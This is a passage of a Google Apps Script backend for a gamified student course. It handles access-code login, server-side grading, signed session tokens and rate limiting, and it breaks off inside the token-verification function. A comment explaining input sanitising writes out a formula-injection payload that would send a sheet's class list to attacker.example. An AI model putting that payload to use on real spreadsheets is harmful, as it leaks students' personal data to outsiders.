/* ══════════════════════════════════════════════════════════════════════════
   AAP101 · DATABASE BACKEND  (Google Apps Script)
   Bound to the "AAP101_Database" Google Sheet.

   This is the ONLY thing that can read or write the database, and — since the
   2026-08 hardening pass — the only thing that decides what a score is.

   THE RULE THIS FILE EXISTS TO ENFORCE:
     The student controls the browser. The browser is therefore never the
     authority. It may ask; this script decides.

   Concretely, the module running on GitHub Pages cannot:
     · say whether an answer was right          (see apiGrade_ / AnswerKey.gs)
     · say how much XP it earned                (the key holds the numbers)
     · say which activities it finished         (_ServerGates is server-written)
     · say what its level, rank, accuracy,
       progress % or badge list are             (all derived here)
     · write arbitrary text into your sheet     (see safeText_)
     · reach an action that is not on the
       allowlist in route_()

   Deploy:  Deploy ▸ New deployment ▸ Web app
            Execute as: Me       Who has access: Anyone
   ══════════════════════════════════════════════════════════════════════════ */

/* ─────────────────────────── CONFIGURATION ─────────────────────────── */

var CODE_COUNT   = 600;                 // how many access codes to generate
var CODE_PREFIX  = 'AAP';               // codes look like AAP-7K3M-9RTX
var CODE_ALPHA   = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';  // no O/0, I/1, L
var TOKEN_TTL_D  = 45;                  // session token lifetime, days

/* Abuse controls. Secondary defence only — never the thing standing between a
   student and someone else's record. */
var RL_PER_MIN   = 45;                  // requests per code per minute
var RL_PER_HOUR  = 600;                 // requests per code per hour
var MAX_EVENTS   = 100;                 // events accepted in one sync
var MAX_FIELD    = 300;                 // characters kept from any client string
var MAX_BODY     = 96 * 1024;           // bytes accepted in one request

var SH_CODES  = 'AccessCodes';
var SH_LOGIN  = 'LoginLog';
var SH_ASSESS = 'Assessments';
var SH_RUN    = 'Runtime';
var SH_EVENT  = 'EventLog';
var SH_SET    = 'Settings';
var SH_SEC    = 'SecurityLog';

/* AccessCodes column map (1-based). Keep in sync with CODES_HEADERS.
   Columns 1–24 are the original schema and have NOT moved — everything the
   hardening added lives in columns 25+. */
var C = {
  CODE:1, STATUS:2, NAME:3, SECTION:4, DEVICE:5, FIRST:6, LAST:7, LOGINS:8,
  MINUTES:9, XP:10, LEVEL:11, RANK:12, ACC:13, CORRECT:14, ATTEMPTS:15,
  STREAK:16, BADGE_N:17, BADGE_L:18, LESSONS:19, PROGRESS:20, ACTS:21,
  LASTPAGE:22, SESSID:23, SESSMIN:24,
  /* ── added 2026-08 (server-authoritative state) ── */
  EPOCH:25, SXP:26, SGATES:27, SCORRECT:28, SATTEMPTS:29, SSTREAK:30,
  SRUN:31, SBADGES:32, SYNCAT:33, SYNCN:34, PREMIG:35, STRIES:36,
  /* Archival, never trusted. Read by nothing that computes a score. */
  LEGBADGES:37, HISTDELTA:38
};

var CODES_HEADERS = [
  'Access Code','Status','Student Name','Section','Device ID','First Login',
  'Last Seen','Logins','Total Minutes','XP','Level','Rank','Accuracy %',
  'Correct','Attempts','Best Streak','Badges','Badge List','Lessons Done',
  'Progress %','Activities Done','Last Page','_SessionId','_SessionMin',
  '_TokenEpoch','_ServerXP','_ServerGates','_ServerCorrect','_ServerAttempts',
  '_ServerStreak','_ServerRun','_ServerBadges','_LastSyncAt','_SyncCount',
  '_PreMigration','_ServerTries','_LegacyBadges_UNVERIFIED','_HistoryDelta'
];

/* The first column added by the hardening pass. Everything from here right is
   bookkeeping and is hidden from the dashboard view. */
var FIRST_NEW_COL = 25;

var LOGIN_HEADERS  = ['Timestamp','Access Code','Student Name','Section','Event','Result','Device ID','Session ID','Browser','Screen'];
var ASSESS_HEADERS = ['Timestamp','Access Code','Student Name','Section','Lesson','Activity ID','Activity Type','Activity Title','Result','Attempt #','XP Awarded','Session ID','Verified','Server Received'];
var RUN_HEADERS    = ['Timestamp','Access Code','Student Name','Section','Session ID','Event','Session Minutes','Page','Note'];
var EVENT_HEADERS  = ['Timestamp','Access Code','Student Name','Section','Type','Detail','Value','Page','Session ID'];
var SEC_HEADERS    = ['Timestamp','Access Code','Device ID','Action','Verdict','Detail','Browser'];

/* ─────────────────────────── WEB APP ENTRY ─────────────────────────── */

/**
 * The module posts JSON as text/plain (a "simple request") so the browser
 * never sends a CORS preflight — Apps Script cannot answer OPTIONS.
 *
 * Every state-changing action arrives here. doGet is a health check only.
 */
function doPost(e) {
  try {
    var raw = (e && e.postData && e.postData.contents) || '{}';
    if (raw.length > MAX_BODY) {
      return json_({ ok: false, error: 'TOO_LARGE', message: 'That request was too large.' });
    }
    var body = JSON.parse(raw);
    return json_(route_(body));
  } catch (err) {
    /* Never hand the client an exception string — it names internal functions
       and sometimes echoes sheet contents. The detail goes to SecurityLog. */
    logSec_('', '', 'doPost', 'ERROR', String(err).slice(0, 400), '');
    return json_({ ok: false, error: 'BAD_REQUEST', message: 'That request could not be read.' });
  }
}

/**
 * GET is a health check and nothing else.
 *
 * The previous version accepted `?payload=<json>&callback=<fn>`, which meant
 * any web page anywhere could invoke check / login / sync in a visitor's
 * browser and read the JSON reply cross-origin (JSONP), and that a plain URL
 * could mutate the sheet. Both are gone. The module has never used that path —
 * assets/auth.js posts.
 */
function doGet(e) {
  return json_({ ok: true, service: 'AAP101', version: 2 });
}

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

/** Explicit allowlist. An action that is not named here does not exist. */
function route_(body) {
  var action = String((body && body.action) || '');
  switch (action) {
    case 'ping':     return { ok: true, service: 'AAP101', time: new Date().toISOString() };
    case 'check':    return apiCheck_(body);
    case 'login':    return apiLogin_(body);
    case 'grade':    return apiGrade_(body);
    case 'sync':     return apiSync_(body);
    default:
      logSec_('', String((body && body.deviceId) || ''), action || '(none)', 'REJECTED',
              'Unknown action', '');
      return { ok: false, error: 'UNKNOWN_ACTION', message: 'That request is not supported.' };
  }
}

/* ═══════════════════ INPUT SAFETY ═══════════════════ */

/**
 * Neutralises text that arrives from a browser before it is written to a cell.
 *
 * Google Sheets evaluates a cell whose text begins with = + - or @. A student
 * who registered as
 *     =IMPORTXML("https://attacker.example/?d="&ENCODEURL(JOIN(",",A2:E50)),"//a")
 * would have that formula run under YOUR account the moment you opened the
 * spreadsheet, quietly posting your class list to someone else's server. The
 * leading quote turns it back into a piece of text.
 */
function safeText_(v, max) {
  var s = String(v == null ? '' : v)
    .replace(/[\r\n\t]+/g, ' ')
    .replace(/[\x00-\x1F\x7F]/g, '')     // control characters
    .trim()
    .slice(0, max || MAX_FIELD);
  if (/^[=+\-@]/.test(s)) s = "'" + s;
  return s;
}

/** Backwards-compatible alias — older call sites used this name. */
function cleanText_(v, max) { return safeText_(v, max); }

/** A finite number inside [lo, hi], or `dflt` for anything else. */
function safeNum_(v, lo, hi, dflt) {
  var n = Number(v);
  if (!isFinite(n)) return dflt;
  if (n < lo) return lo;
  if (n > hi) return hi;
  return n;
}

/* ═══════════════════ RATE LIMITING ═══════════════════ */

/**
 * Coarse per-code and per-device budget. CacheService counters are not atomic,
 * so this leaks a little under concurrency — that is fine. It exists to stop a
 * script hammering the endpoint, not to be a security boundary.
 */
function rateOk_(code, dev) {
  try {
    var cache = CacheService.getScriptCache();
    var keys = [
      { k: 'rlm_' + code, cap: RL_PER_MIN,  ttl: 60 },
      { k: 'rlh_' + code, cap: RL_PER_HOUR, ttl: 3600 },
      { k: 'rld_' + String(dev).slice(0, 60), cap: RL_PER_MIN * 2, ttl: 60 }
    ];
    for (var i = 0; i < keys.length; i++) {
      var n = Number(cache.get(keys[i].k) || 0) + 1;
      cache.put(keys[i].k, String(n), keys[i].ttl);
      if (n > keys[i].cap) return false;
    }
    return true;
  } catch (e) {
    return true;   // cache unavailable — fail open, this is a secondary control
  }
}

/* ═══════════════════ AUTHENTICATION ═══════════════════ */

/**
 * One place where "who is this request from?" is answered.
 *
 * Resolves the caller against the sheet and refuses if anything is off. The
 * caller supplies a code, a device id and a token; NONE of those are believed
 * on their own — the token must carry a signature this script made, for that
 * exact code and device, and the sheet must still agree that the code is
 * active and bound to that device.
 *
 * @return {{ok:boolean, row:number, rec:Array, code:string, dev:string}|Object}
 */
function authenticate_(b) {
  var code = normCode_(b && b.code);
  var dev  = String((b && b.deviceId) || '');
  if (!code || !dev) return { ok: false, error: 'BAD_REQUEST', message: 'Please sign in again.' };

  if (!rateOk_(code, dev)) {
    logSec_(code, dev, 'rate', 'REJECTED', 'Rate limit exceeded', b.ua);
    return { ok: false, error: 'RATE_LIMIT', message: 'Too many requests. Please wait a moment.' };
  }

  var row = findCodeRow_(code);
  if (!row) {
    logSec_(code, dev, 'auth', 'REJECTED', 'Code not found', b.ua);
    return { ok: false, error: 'BAD_TOKEN', message: 'Your session has expired. Please log in again.' };
  }

  var rec = sheet_(SH_CODES).getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];

  /* A disabled code must stop working immediately — not when its token
     eventually expires. The old build checked Status at login only, so a
     student disabled mid-term kept syncing for months. */
  if (String(rec[C.STATUS - 1]).toUpperCase() === 'DISABLED') {
    logSec_(code, dev, 'auth', 'REJECTED', 'Code disabled', b.ua);
    return { ok: false, error: 'DISABLED', message: 'This access code has been disabled. Please contact your instructor.' };
  }

  if (String(rec[C.DEVICE - 1] || '') !== dev) {
    logSec_(code, dev, 'auth', 'REJECTED', 'Device mismatch', b.ua);
    return { ok: false, error: 'DEVICE_LOCKED', message: 'This code is now in use on another device.' };
  }

  var epoch = Number(rec[C.EPOCH - 1] || 1);
  if (!verifyToken_(b.token, code, dev, epoch)) {
    logSec_(code, dev, 'auth', 'REJECTED', 'Bad or expired token', b.ua);
    return { ok: false, error: 'BAD_TOKEN', message: 'Your session has expired. Please log in again.' };
  }

  return { ok: true, row: row, rec: rec, code: code, dev: dev };
}

/* ─────────────────────────── API: CHECK ─────────────────────────── */
/* Step 1 of login. Is this code real? Is it already claimed? Does this
   device already own it? Tells the client whether to ask for a name.     */

function apiCheck_(b) {
  var code = normCode_(b.code);
  var dev  = String(b.deviceId || '');
  if (!code) return { ok: false, error: 'BAD_CODE', message: 'Please enter your access code.' };
  if (!rateOk_(code, dev)) {
    return { ok: false, error: 'RATE_LIMIT', message: 'Too many attempts. Please wait a minute and try again.' };
  }

  var row = findCodeRow_(code);
  if (!row) {
    logLogin_(code, '', '', 'CHECK', 'REJECTED — code not found', dev, '', b.ua, b.screen);
    return { ok: false, error: 'NOT_FOUND', message: 'That access code is not recognised. Please check for typos.' };
  }

  var sh  = sheet_(SH_CODES);
  var rec = sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];

  if (String(rec[C.STATUS - 1]).toUpperCase() === 'DISABLED') {
    logLogin_(code, rec[C.NAME - 1], rec[C.SECTION - 1], 'CHECK', 'REJECTED — disabled', dev, '', b.ua, b.screen);
    return { ok: false, error: 'DISABLED', message: 'This access code has been disabled. Please contact your instructor.' };
  }

  var boundDevice = String(rec[C.DEVICE - 1] || '');
  var claimed     = !!boundDevice;

  if (!claimed) return { ok: true, stage: 'REGISTER' };            // fresh code → ask for name

  if (boundDevice === dev) {                                       // same device → straight in
    return { ok: true, stage: 'RETURNING', name: rec[C.NAME - 1], section: rec[C.SECTION - 1] };
  }

  logLogin_(code, rec[C.NAME - 1], rec[C.SECTION - 1], 'CHECK', 'REJECTED — device mismatch', dev, '', b.ua, b.screen);
  /* Deliberately does not name the student it belongs to. The old wording
     returned a masked name, which confirmed to anyone holding a guessed code
     that it was live and leaked a fragment of someone else's identity. */
  return {
    ok: false, error: 'DEVICE_LOCKED',
    message: 'This access code is already registered to a different device. ' +
             'If it is yours and you changed devices, ask your instructor to release it.'
  };
}

/* ─────────────────────────── API: LOGIN ─────────────────────────── */

function apiLogin_(b) {
  var code = normCode_(b.code);
  var dev  = String(b.deviceId || '');
  if (!code || !dev) return { ok: false, error: 'BAD_REQUEST', message: 'Please enter your access code.' };
  if (!rateOk_(code, dev)) {
    return { ok: false, error: 'RATE_LIMIT', message: 'Too many attempts. Please wait a minute and try again.' };
  }

  var lock = LockService.getScriptLock();
  try { lock.waitLock(20000); } catch (err) {
    return { ok: false, error: 'BUSY', message: 'The server is busy. Please try again in a moment.' };
  }

  try {
    var row = findCodeRow_(code);
    if (!row) {
      logLogin_(code, '', '', 'LOGIN', 'REJECTED — code not found', dev, '', b.ua, b.screen);
      return { ok: false, error: 'NOT_FOUND', message: 'That access code is not recognised.' };
    }

    var sh  = sheet_(SH_CODES);
    var rec = sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];

    if (String(rec[C.STATUS - 1]).toUpperCase() === 'DISABLED') {
      logLogin_(code, rec[C.NAME - 1], rec[C.SECTION - 1], 'LOGIN', 'REJECTED — disabled', dev, '', b.ua, b.screen);
      return { ok: false, error: 'DISABLED', message: 'This access code has been disabled.' };
    }

    var bound = String(rec[C.DEVICE - 1] || '');
    var now   = new Date();
    var name, section;

    if (!bound) {
      /* First ever use — claim the code for this device and this student. */
      name    = safeText_(b.name, 80);
      section = safeText_(b.section, 40);
      if (name.replace(/^'/, '').length < 2) {
        return { ok: false, error: 'NAME_REQUIRED', message: 'Please enter your full name.' };
      }
      /* Write the name only if we do not already have one. Releasing a device
         lock used to reopen this branch, which let the next person to use the
         code rename the student it belongs to. */
      var hadName = String(rec[C.NAME - 1] || '').trim();
      if (!hadName) {
        sh.getRange(row, C.NAME).setValue(name);
        sh.getRange(row, C.SECTION).setValue(section);
      } else {
        name    = hadName;
        section = String(rec[C.SECTION - 1] || '');
      }
      sh.getRange(row, C.DEVICE).setValue(dev);
      sh.getRange(row, C.STATUS).setValue('ACTIVE');
      if (!rec[C.FIRST - 1]) sh.getRange(row, C.FIRST).setValue(now);
      logLogin_(code, name, section, 'REGISTER', 'OK — code claimed', dev, b.sessionId, b.ua, b.screen);

    } else if (bound === dev) {
      /* Returning student on their own device. */
      name    = String(rec[C.NAME - 1] || '');
      section = String(rec[C.SECTION - 1] || '');
      logLogin_(code, name, section, 'LOGIN', 'OK', dev, b.sessionId, b.ua, b.screen);

    } else {
      logLogin_(code, rec[C.NAME - 1], rec[C.SECTION - 1], 'LOGIN', 'REJECTED — device mismatch', dev, '', b.ua, b.screen);
      return { ok: false, error: 'DEVICE_LOCKED', message: 'This access code is registered to another device.' };
    }

    sh.getRange(row, C.LAST).setValue(now);
    sh.getRange(row, C.LOGINS).setValue(Number(rec[C.LOGINS - 1] || 0) + 1);

    var epoch = Number(rec[C.EPOCH - 1] || 0);
    if (!epoch) { epoch = 1; sh.getRange(row, C.EPOCH).setValue(1); }

    /* Remember what the module says its gates are, so auditAnswerKey() can
       tell you when content.js and AnswerKey.gs have drifted apart. */
    rememberClientGates_(b.gates);

    /* Re-read after the writes so the state we hand back is current. */
    rec = sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];

    return {
      ok: true,
      token: makeToken_(code, dev, epoch),
      /* Hand back the pretty dashed form from the sheet — it is what the
         student sees. Codes are compared canonically, so it round-trips. */
      code: String(rec[C.CODE - 1] || code),
      name: name,
      section: section,
      /* The authoritative record. The module renders this instead of whatever
         happens to be sitting in the browser's localStorage, so clearing your
         browser — or editing it — changes nothing that counts. */
      state: publicState_(rec)
    };
  } finally {
    lock.releaseLock();
  }
}

/* ─────────────────────────── API: GRADE ─────────────────────────── */
/**
 * The heart of the hardening pass.
 *
 * The browser sends *what the student did* — the option they clicked, the
 * tiles they placed, the answers they gave in a speed round. It does not send
 * a score, and there is nothing it can send that would be treated as one. The
 * key lives in AnswerKey.gs, the XP figures live in AnswerKey.gs, and the
 * cleared-gate list lives in this spreadsheet.
 */
function apiGrade_(b) {
  var auth = authenticate_(b);
  if (!auth.ok) return auth;

  var spec = gateSpec_(b.gate);
  if (!spec) {
    /* Allowlist: an activity we have never heard of cannot be completed. */
    logSec_(auth.code, auth.dev, 'grade', 'REJECTED', 'Unknown gate: ' + String(b.gate).slice(0, 60), b.ua);
    return { ok: false, error: 'UNKNOWN_ACTIVITY', message: 'That activity was not recognised.' };
  }

  var res = gradeAnswer_(spec, b.answer);
  if (!res.ok) {
    /* Malformed submissions are rejected requests, not wrong answers — they
       must not pollute the attempt count or the accuracy figure. */
    logSec_(auth.code, auth.dev, 'grade', 'REJECTED', spec.gate + ': ' + res.error, b.ua);
    return { ok: false, error: 'BAD_ANSWER', message: 'That answer could not be read. Please try again.' };
  }

  var lock = LockService.getScriptLock();
  try { lock.waitLock(20000); } catch (err) {
    return { ok: false, error: 'BUSY', message: 'The server is busy. Please try again in a moment.' };
  }

  try {
    var sh  = sheet_(SH_CODES);
    var row = auth.row;
    /* Re-read under the lock: another tab may have moved things on. */
    var rec = sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];

    var st         = readState_(rec);
    var firstClear = !st.gates[spec.gate];

    /* ── Attempt accounting (server-side, so accuracy cannot be dressed up) ── */
    st.tries[spec.gate] = (st.tries[spec.gate] || 0) + 1;
    var firstTry = (st.tries[spec.gate] === 1);
    st.attempts += 1;
    if (res.correct) {
      st.correct += 1;
      st.run     += 1;
      if (st.run > st.streak) st.streak = st.run;
    } else {
      st.run = 0;
    }

    /* ── Award ──
       A gate pays out once. Speed rounds may be replayed for a reduced bonus,
       which is what the module has always done — but the size of that bonus is
       decided here, not by the page. */
    var award = 0;
    if (res.correct) {
      if (firstClear) {
        award = res.xp;
        /* The module has always paid a bonus for a clean run. It still does —
           but "clean" is now a fact this server established, not a number the
           page sent. The one exception is a memory match, where a miss is no
           more checkable than the rest of the activity; that bonus is clamped
           to the two values the original module could produce. */
        if (spec.bonusFirstTry && firstTry && res.clean) {
          award += spec.bonusFirstTry;
        } else if (spec.bonusClean) {
          award += (b.clean === true) ? spec.bonusClean : (spec.bonusMessy || 0);
        }
        st.gates[spec.gate] = true;
      } else if (spec.type === 'boss') {
        award = Math.round(res.xp * 0.35);
      }
    }
    st.xp += award;

    /* ── Badges ── only ids this server recognises, only on a first clear ── */
    var asked = Array.isArray(b.badges) ? b.badges.slice(0, 5) : [];
    var earned = badgesFor_(spec, res, firstClear, asked, firstTry);
    if (st.run >= 5) earned.push('combo5');
    /* "First Steps" is for opening your first activity — the server knows when
       that happened without being told. */
    if (res.correct) earned.push('first-steps');
    addBadges_(st, earned);
    awardCompletionBadges_(st);

    writeState_(sh, row, st, new Date());

    /* ── Record the submission ──
       Timestamped by the server. The client's clock is not consulted, so a
       submission cannot be backdated to look like it happened during class. */
    appendRows_(SH_ASSESS, [[
      new Date(), auth.code, String(rec[C.NAME - 1] || ''), String(rec[C.SECTION - 1] || ''),
      spec.mod + String(spec.lesson), spec.gate, spec.type,
      safeText_(b.title, 120),
      res.correct ? (firstClear ? 'COMPLETED' : 'REPLAY') : 'WRONG',
      st.attempts, award, safeText_(b.sid, 60),
      spec.graded ? 'CHECKED' : 'CLAIMED',
      new Date()
    ]]);

    var out = {
      ok: true,
      correct: !!res.correct,
      firstClear: firstClear && !!res.correct,
      xpAwarded: award,
      right: res.right, total: res.total, accuracy: res.accuracy,
      state: publicState_(sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0])
    };
    /* Feedback detail, scoped so it never doubles as an answer key. */
    if (res.wrong)        out.wrong = res.wrong;
    if (res.missedCount)  out.missedCount = res.missedCount;
    if (res.perfect)      out.perfect = true;
    if (res.review)       out.review = res.review;   // speed round is over — safe
    /* The explanation belonging to the options they picked, and only those. */
    var fb = feedbackFor_(spec, b.answer);
    if (fb) out.fb = fb;
    return out;

  } finally {
    lock.releaseLock();
  }
}

/* ─────────────────────────── API: SYNC ─────────────────────────── */
/**
 * Telemetry only, now.
 *
 * It still carries the activity log that drives your Assessments / Runtime /
 * EventLog tabs and the live study-time figure. What it no longer does is
 * decide anything: the XP, level, rank, accuracy, badge, lesson and progress
 * columns are recomputed here from server state and overwrite whatever the
 * browser thinks. A tampered snapshot changes nothing.
 */
function apiSync_(b) {
  var auth = authenticate_(b);
  if (!auth.ok) return auth;

  var lock = LockService.getScriptLock();
  try { lock.waitLock(25000); } catch (err) {
    return { ok: false, error: 'BUSY' };   // client keeps the batch and retries
  }

  try {
    var sh   = sheet_(SH_CODES);
    var row  = auth.row;
    var rec  = sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];
    var name = String(rec[C.NAME - 1] || '');
    var sect = String(rec[C.SECTION - 1] || '');
    var now  = new Date();

    /* ── 1. Append the batched events, grouped so each sheet is written once ──
       Capped: one request used to be able to append an unbounded number of
       rows of unbounded length, which both floods the sheet and holds the
       script-wide lock long enough to stall the whole class. */
    var events = b.events || [];
    if (!Array.isArray(events)) events = [];
    var dropped = Math.max(0, events.length - MAX_EVENTS);
    if (dropped) events = events.slice(0, MAX_EVENTS);

    var buckets = { assess: [], run: [], event: [] };

    for (var i = 0; i < events.length; i++) {
      var ev = events[i] || {};
      /* The client's own timestamp is kept for ordering, but it is clamped to
         a sane window and the server's receipt time is recorded alongside. */
      var ts = clampDate_(ev.ts, now);

      if (ev.kind === 'answer' || ev.kind === 'activity') {
        /* Grading moved to apiGrade_. These are kept only as a UI-side record
           of what the student was doing, and are marked so they can never be
           mistaken for a checked result. */
        buckets.event.push([ts, auth.code, name, sect, 'ui-' + safeText_(ev.kind, 20),
          safeText_(ev.actTitle || ev.actId, 120), safeText_(ev.actId, 60),
          safeText_(ev.page, 60), safeText_(ev.sid, 60)]);

      } else if (ev.kind === 'runtime') {
        buckets.run.push([ts, auth.code, name, sect, safeText_(ev.sid, 60),
          safeText_(ev.event, 40), safeNum_(ev.minutes, 0, 1440, 0),
          safeText_(ev.page, 60), safeText_(ev.note, MAX_FIELD)]);

      } else {
        buckets.event.push([ts, auth.code, name, sect, safeText_(ev.kind || 'event', 20),
          safeText_(ev.detail, MAX_FIELD),
          ev.value == null ? '' : safeText_(ev.value, 120),
          safeText_(ev.page, 60), safeText_(ev.sid, 60)]);
      }
    }

    appendRows_(SH_ASSESS, buckets.assess);
    appendRows_(SH_RUN,    buckets.run);
    appendRows_(SH_EVENT,  buckets.event);

    /* ── 2. Study time ──
       Accumulates across sessions without double counting, and can no longer
       be inflated: the claimed increase is capped by the wall-clock time this
       server has actually observed passing since the last sync. */
    var st = readState_(rec);
    var s  = b.snapshot || {};
    var totalMin = Number(rec[C.MINUTES - 1] || 0);

    if (s.sessionMinutes != null && b.sid) {
      var claimed = safeNum_(s.sessionMinutes, 0, 1440, 0);
      var lastId  = String(rec[C.SESSID - 1] || '');
      var lastMin = Number(rec[C.SESSMIN - 1] || 0);
      var delta   = (lastId === String(b.sid)) ? (claimed - lastMin) : claimed;

      var lastAt  = rec[C.SYNCAT - 1] ? new Date(rec[C.SYNCAT - 1]).getTime() : 0;
      var elapsed = lastAt ? (now.getTime() - lastAt) / 60000 : claimed;
      var ceiling = Math.max(0, elapsed) + 2;      // +2 min of slack for clock drift

      if (delta > 0) totalMin += Math.min(delta, ceiling);
    }

    /* ── 3. Write the dashboard from server state, not from the snapshot ── */
    writeState_(sh, row, st, now, {
      minutes:  round1_(totalMin),
      lastPage: safeText_(s.lastPage, 60),
      sid:      safeText_(b.sid, 60),
      sessMin:  safeNum_(s.sessionMinutes, 0, 1440, 0)
    });

    /* The module renders this instead of its own localStorage, so a browser
       that has been edited snaps back to the truth on the next sync. */
    return { ok: true, received: events.length, dropped: dropped, state: pubFromState_(st) };
  } finally {
    lock.releaseLock();
  }
}

/* ═══════════════════ SERVER-SIDE PROGRESS STATE ═══════════════════ */

/** Reads the authoritative state out of a row. */
function readState_(rec) {
  var gates = {};
  String(rec[C.SGATES - 1] || '').split(',').forEach(function (g) {
    g = g.trim();
    if (g && gateSpec_(g)) gates[g] = true;
  });

  var badges = {};
  String(rec[C.SBADGES - 1] || '').split(',').forEach(function (x) {
    x = x.trim();
    if (x && BADGE_NAMES.hasOwnProperty(x)) badges[x] = true;
  });

  /* Per-activity attempt counts, so "cleared it first time" is something this
     server knows rather than something the page asserts. */
  var tries = {};
  try {
    var t = JSON.parse(String(rec[C.STRIES - 1] || '{}'));
    for (var g in t) if (t.hasOwnProperty(g) && gateSpec_(g)) tries[g] = Number(t[g]) || 0;
  } catch (e) { tries = {}; }

  return {
    xp:       Number(rec[C.SXP - 1] || 0),
    correct:  Number(rec[C.SCORRECT - 1] || 0),
    attempts: Number(rec[C.SATTEMPTS - 1] || 0),
    streak:   Number(rec[C.SSTREAK - 1] || 0),
    run:      Number(rec[C.SRUN - 1] || 0),
    gates:    gates,
    badges:   badges,
    tries:    tries
  };
}

function addBadges_(st, ids) {
  for (var i = 0; i < ids.length; i++) {
    if (BADGE_NAMES.hasOwnProperty(ids[i])) st.badges[ids[i]] = true;
  }
}

/** Midterm / Final / Scholar, decided from the cleared-gate set. */
function awardCompletionBadges_(st) {
  var map = lessonMap_(), k, g, done;
  var mods = { m: true, f: true };
  for (k in map) {
    if (!map.hasOwnProperty(k)) continue;
    done = true;
    for (g = 0; g < map[k].length; g++) if (!st.gates[map[k][g]]) { done = false; break; }
    if (!done) mods[k.charAt(0)] = false;
  }
  if (mods.m) st.badges['midterm'] = true;
  if (mods.f) st.badges['final'] = true;
  if (mods.m && mods.f) st.badges['scholar'] = true;
}

/** Everything the dashboard shows, derived from state. Nothing client-sent. */
function derive_(st) {
  var all = allGates_();
  var cleared = 0, i;
  for (i = 0; i < all.length; i++) if (st.gates[all[i]]) cleared++;

  var map = lessonMap_(), lessons = 0, k, g, done;
  for (k in map) {
    if (!map.hasOwnProperty(k)) continue;
    done = map[k].length > 0;
    for (g = 0; g < map[k].length; g++) if (!st.gates[map[k][g]]) { done = false; break; }
    if (done) lessons++;
  }

  var badgeIds = [], names = [];
  for (k in st.badges) if (st.badges.hasOwnProperty(k)) badgeIds.push(k);
  badgeIds.sort();
  for (i = 0; i < badgeIds.length; i++) names.push(BADGE_NAMES[badgeIds[i]]);

  var rank = rankFor_(st.xp);
  return {
    xp: st.xp, level: rank.lvl, rank: rank.name,
    accuracy: st.attempts ? Math.round((st.correct / st.attempts) * 100) : 0,
    correct: st.correct, attempts: st.attempts, streak: st.streak,
    badgeCount: badgeIds.length, badgeIds: badgeIds, badgeList: names.join(', '),
    lessons: lessons, activities: cleared,
    progress: all.length ? Math.round((cleared / all.length) * 100) : 0
  };
}

/**
 * Writes state + the derived dashboard columns in one range write.
 * Columns 1–6 (code, status, name, section, device, first login) are never
 * touched here, so nothing about the student's identity can move.
 */
function writeState_(sh, row, st, now, extra) {
  extra = extra || {};
  var d = derive_(st);
  st.pub = d;

  var gateIds = [], k;
  for (k in st.gates) if (st.gates.hasOwnProperty(k)) gateIds.push(k);
  gateIds.sort();

  /* One contiguous write, columns LAST(7) → PREMIG(35). */
  var width = C.PREMIG - C.LAST + 1;
  var out = sh.getRange(row, C.LAST, 1, width).getValues()[0];
  function put(col, val) { if (val !== undefined && val !== null) out[col - C.LAST] = val; }

  put(C.LAST, now);
  if (extra.minutes  !== undefined) put(C.MINUTES, extra.minutes);
  if (extra.lastPage) put(C.LASTPAGE, extra.lastPage);
  if (extra.sid) { put(C.SESSID, extra.sid); put(C.SESSMIN, round1_(extra.sessMin || 0)); }

  /* Derived — the browser has no input into any of these. */
  put(C.XP,       d.xp);
  put(C.LEVEL,    d.level);
  put(C.RANK,     d.rank);
  put(C.ACC,      d.accuracy);
  put(C.CORRECT,  d.correct);
  put(C.ATTEMPTS, d.attempts);
  put(C.STREAK,   d.streak);
  put(C.BADGE_N,  d.badgeCount);
  put(C.BADGE_L,  d.badgeList);
  put(C.LESSONS,  d.lessons);
  put(C.PROGRESS, d.progress);
  put(C.ACTS,     d.activities);

  /* Raw state. */
  put(C.SXP,       st.xp);
  put(C.SGATES,    gateIds.join(','));
  put(C.SCORRECT,  st.correct);
  put(C.SATTEMPTS, st.attempts);
  put(C.SSTREAK,   st.streak);
  put(C.SRUN,      st.run);
  put(C.SBADGES,   d.badgeIds.join(','));
  put(C.STRIES,    JSON.stringify(sortedMap_(st.tries || {})).slice(0, 4000));
  put(C.SYNCAT,    now);
  put(C.SYNCN,     Number(out[C.SYNCN - C.LAST] || 0) + 1);

  sh.getRange(row, C.LAST, 1, width).setValues([out]);
}

/** The shape the module receives. Read-only as far as the student is concerned. */
function publicState_(rec) { return pubFromState_(readState_(rec)); }

function pubFromState_(st) {
  var d  = derive_(st);
  var gateIds = [], k;
  for (k in st.gates) if (st.gates.hasOwnProperty(k)) gateIds.push(k);
  return {
    xp: d.xp, level: d.level, rank: d.rank,
    correct: d.correct, attempts: d.attempts, accuracy: d.accuracy,
    bestStreak: d.streak, run: st.run,
    gates: gateIds.sort(), badges: d.badgeIds,
    lessonsDone: d.lessons, activitiesDone: d.activities, progressPct: d.progress
  };
}

/* ─────────────────────────── SESSION TOKENS ─────────────────────────── */
/* Signed with a secret that lives in Script Properties, so a token cannot be
   forged by anyone reading the module's JavaScript.

   The epoch is the revocation handle: bumping a student's _TokenEpoch makes
   every token ever issued to them stop verifying, which is what "release the
   device" and "disable the code" now do.                                    */

function secret_() {
  var props = PropertiesService.getScriptProperties();
  var s = props.getProperty('AAP_SECRET');
  if (!s) {
    s = Utilities.getUuid() + Utilities.getUuid();
    props.setProperty('AAP_SECRET', s);
  }
  return s;
}

function makeToken_(code, dev, epoch) {
  var payload = normCode_(code) + '|' + dev + '|' + Date.now() + '|' + (epoch || 1);
  var sig = Utilities.base64EncodeWebSafe(
    Utilities.computeHmacSha256Signature(payload, secret_()));
  return Utilities.base64EncodeWebSafe(payload) + '.' + sig;
}

function verifyToken_(token, code, dev, epoch) {
  if (!token || !code || !dev) return false;
  var parts = String(token).split('.');
  if (parts.length !== 2) return false;

  var payload;
  try { payload = Utilities.newBlob(Utilities.base64DecodeWebSafe(parts[0])).getDataAsString(); }
  catch (e) { return false; }

  var expect = Utilities.base64EncodeWebSafe(
    Utilities.computeHmacSha256Signature(payload, secret_()));
  if (expect !== parts[1]) return false;

  var f = payload.split('|');
